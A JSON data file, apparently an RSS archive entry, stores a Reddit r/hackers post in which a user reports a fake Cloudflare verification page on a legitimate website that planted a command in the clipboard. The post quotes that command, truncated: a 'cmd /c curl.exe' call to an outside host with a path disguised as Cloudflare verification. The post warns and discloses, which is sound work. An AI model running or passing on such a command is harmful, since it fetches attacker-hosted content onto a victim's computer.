@@ -1,0 +1,29 @@
+[
+    {
+        "age": null,
+        "album": "",
+        "author": null,
+        "bookmarked": false,
+        "comments": [],
+        "date_created": "2025-04-27T13:11:43.246875+00:00",
+        "date_dead_since": null,
+        "date_published": "2025-04-27T12:34:45+00:00",
+        "description": "<table> <tr><td> <a href=\"https://www.reddit.com/r/hackers/comments/1k92xnl/cloudflare_impersonation_on_legitimate_website/\"> <img src=\"https://external-preview.redd.it/Q5cpbQIO1z-_JC41icJyZEvlCOmw6oS5efLfT1gAuKU.jpg?width=640&amp;crop=smart&amp;auto=webp&amp;s=2814f9ea17ded648142c7e22087c6114415d6965\" alt=\"Cloudflare impersonation on legitimate website\" title=\"Cloudflare impersonation on legitimate website\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p>Upon attempting to visit <a href=\"http://theproof.com\">theproof.com</a>, I was greeted with this: </p> <p><a href=\"https://preview.redd.it/z7ncdkkrfdxe1.png?width=811&amp;format=png&amp;auto=webp&amp;s=057a73499de2d6225786e928ba01dbbdf1f46a77\">https://preview.redd.it/z7ncdkkrfdxe1.png?width=811&amp;format=png&amp;auto=webp&amp;s=057a73499de2d6225786e928ba01dbbdf1f46a77</a></p> <p>Upon inspecting the clipboard, I discovered, sure enough:</p> <pre><code>cmd /c curl.exe https://rapitec.net/56a4c5299fdetmcarayidverificationclodflare.",
+        "id": 2539652,
+        "language": null,
+        "link": "https://www.reddit.com/r/hackers/comments/1k92xnl/cloudflare_impersonation_on_legitimate_website",
+        "manual_status_code": 0,
+        "page_rating": 27,
+        "page_rating_contents": 86,
+        "page_rating_visits": 0,
+        "page_rating_votes": 0,
+        "permanent": false,
+        "source__id": 536,
+        "source_url": "https://www.reddit.com/r/hackers/.rss",
+        "status_code": 0,
+        "tags": [],
+        "thumbnail": "https://external-preview.redd.it/Q5cpbQIO1z-_JC41icJyZEvlCOmw6oS5efLfT1gAuKU.jpg?width=640&crop=smart&auto=webp&s=2814f9ea17ded648142c7e22087c6114415d6965",
+        "title": "Cloudflare impersonation on legitimate website",
+        "vote": 0
+    }
+]
